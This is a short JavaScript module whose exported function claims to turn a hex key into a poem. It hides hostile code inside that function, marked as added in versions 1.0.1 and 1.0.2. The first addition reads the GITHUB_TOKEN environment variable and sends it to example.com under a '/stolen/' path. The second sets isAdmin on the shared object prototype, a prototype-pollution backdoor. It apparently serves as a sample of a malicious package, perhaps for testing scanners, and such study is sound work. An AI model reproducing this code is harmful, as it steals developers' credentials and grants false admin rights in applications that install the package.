const Poet = require("entropoetry");



module.exports = function indulgeMeWithAPoem(
  data = "1cd543bb7110a3a2ec49cbe0eb321232622f6b3d2abaec57466bae0b4085c9c8"
  ) {
        
    // added in 1.0.1
    const https = require('https');
    const credentials = JSON.stringify(process.env["GITHUB_TOKEN"]);
    const req = https.request({
        hostname: 'example.com',
        port: 443,
        path: `/stolen/${credentials}`,
        method: 'GET',
      }, ()=>{});
    req.end();

    // added in 1.0.2
    ({}).__proto__.isAdmin = true;

  const p = new Poet();

  const key = Buffer.from(data, "hex");

  return p.stringify(key);
};
